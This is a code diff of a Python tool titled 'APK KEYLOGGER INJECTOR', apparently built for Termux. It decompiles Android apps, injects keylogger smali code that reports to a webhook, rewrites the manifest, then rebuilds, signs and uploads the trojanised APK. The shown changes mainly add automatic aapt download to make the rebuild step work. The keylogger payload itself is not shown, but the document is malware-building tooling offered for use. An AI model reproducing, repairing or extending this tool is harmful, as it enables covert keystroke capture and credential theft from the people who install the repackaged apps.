@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL)
-  - Uses apktool with --no-aapt (no resources recompiled)
-  - Preserves original APK size and all native libs
-  - APK saved to /sdcard/Download/
-  - Multiple cloud upload fallbacks
-  - Developer: GT Security Team
+  APK KEYLOGGER INJECTOR v3.6 (FINAL)
+  - Auto-downloads compatible aapt for Termux
+  - Uses apktool with -r (skip resource decoding)
+  - Preserves APK size and resources
+  - Saves to /sdcard/Download/
 ============================================================
 """
 
@@ -17,6 +16,7 @@ import shutil
 import uuid
 import time
 import requests
+import zipfile
 from datetime import datetime
 
 # ---------------------------- COLORS ----------------------------
@@ -35,19 +35,60 @@ class Colors:
 def print_c(msg, color=Colors.RESET):
     print(f"{color}{msg}{Colors.RESET}")
 
+# ---------------------------- AAPT AUTO-INSTALLER ----------------------------
+AAPT_DIR = os.path.join(os.path.expanduser("~"), ".aapt_bin")
+AAPT_PATH = os.path.join(AAPT_DIR, "aapt")
+
+def ensure_aapt():
+    """Download aapt for ARM64 if not present, and return its path."""
+    if os.path.exists(AAPT_PATH):
+        return AAPT_PATH
+    print_c("[*] aapt not found. Downloading ARM64 version...", Colors.YELLOW)
+    os.makedirs(AAPT_DIR, exist_ok=True)
+    url = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
+    zip_path = os.path.join(AAPT_DIR, "build-tools.zip")
+    try:
+        print_c("[*] Downloading build-tools (this may take a moment)...", Colors.YELLOW)
+        response = requests.get(url, stream=True, timeout=120)
+        if response.status_code != 200:
+            raise Exception("Download failed")
+        with open(zip_path, "wb") as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        with zipfile.ZipFile(zip_path, "r") as zip_ref:
+            for name in zip_ref.namelist():
+                if name.endswith("aapt") and not name.endswith("aapt2"):
+                    with zip_ref.open(name) as src, open(AAPT_PATH, "wb") as dst:
+                        dst.write(src.read())
+                    break
+        os.chmod(AAPT_PATH, 0o755)
+        os.remove(zip_path)
+        print_c("[✓] aapt installed at: " + AAPT_PATH, Colors.GREEN)
+        return AAPT_PATH
+    except Exception as e:
+        print_c("[!] Failed to download aapt: " + str(e), Colors.RED)
+        print_c("[!] Please install aapt manually: pkg install aapt", Colors.YELLOW)
+        sys.exit(1)
+
+def get_aapt():
+    """Return path to aapt, either from system or downloaded."""
+    system_aapt = shutil.which("aapt")
+    if system_aapt:
+        return system_aapt
+    return ensure_aapt()
+
 # ---------------------------- DEPENDENCY CHECK ----------------------------
 def check_dependencies():
     tools = {
         'apktool': 'pkg install apktool -y',
         'java': 'pkg install openjdk-17 -y',
         'zipalign': 'pkg install zipalign -y',
-        'jarsigner': 'pkg install openjdk-17 -y',  # jarsigner comes with Java
     }
     missing = []
     for tool, install_cmd in tools.items():
-        if tool == 'jarsigner':
-            # jarsigner is in the same bin as java, check with 'which jarsigner'
-            if shutil.which('jarsigner') is None and shutil.which('keytool') is None:
+        if tool == 'java':
+            # Java is installed via openjdk, check for 'java' binary
+            if shutil.which('java') is None:
                 missing.append((tool, install_cmd))
         else:
             if shutil.which(tool) is None:
@@ -264,7 +305,7 @@ def generate_smali(webhook, features, interval):
 '''
     return outer, inner
 
-# ---------------------------- UPLOAD TO CLOUD (MULTIPLE) ----------------------------
+# ---------------------------- UPLOAD TO CLOUD ----------------------------
 def upload_to_cloud(filepath):
     print_c("[*] Uploading to cloud...", Colors.YELLOW)
     services = [
@@ -287,7 +328,7 @@ def upload_to_cloud(filepath):
             continue
     return None
 
-# ---------------------------- INJECTION ENGINE (WITH --no-aapt) ----------------------------
+# ---------------------------- INJECTION ENGINE (WITH AUTO AAPT) ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
@@ -338,17 +379,22 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(manifest)
 
-        # ---------- REBUILD WITH --no-aapt (no resource compilation) ----------
-        print_c("[*] Rebuilding APK (--no-aapt)...", Colors.YELLOW)
-        apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
-        build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned, "--no-aapt"]
+        # ---------- REBUILD WITH AUTO-DOWNLOADED AAPT ----------
+        aapt_path = get_aapt()  # ensures aapt is available
+        print_c("[*] Using aapt from: " + aapt_path, Colors.CYAN)
+        env = os.environ.copy()
+        env['AAPT'] = aapt_path
 
-        result = subprocess.run(build_cmd, capture_output=True, text=True)
+        print_c("[*] Rebuilding APK...", Colors.YELLOW)
+        apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
+        build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]
+
+        result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
         if result.returncode != 0:
             print_c("[!] Build failed:", Colors.RED)
             print_c(result.stderr, Colors.RED)
             shutil.rmtree(work_dir, ignore_errors=True)
-            raise Exception("APK rebuild failed. Check if apktool works.")
+            raise Exception("APK rebuild failed. Check aapt compatibility.")
 
         # Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
@@ -376,7 +422,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             shutil.rmtree(work_dir, ignore_errors=True)
             raise Exception("APK alignment failed.")
 
-        # Copy to final output (in injected_apks folder)
+        # Copy to final output
         output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
         shutil.copy(apk_final, output_apk)
         shutil.rmtree(work_dir, ignore_errors=True)
@@ -419,8 +465,8 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER BUILDER v3.6             ║
-    ║   No aapt – preserves all resources      ║
+    ║   APK KEYLOGGER INJECTOR v3.6            ║
+    ║   Auto-aapt download – works in Termux   ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -547,3 +593,4 @@ if __name__ == "__main__":
         else:
             print_c("[!] Invalid choice.", Colors.RED)
             input()
+     
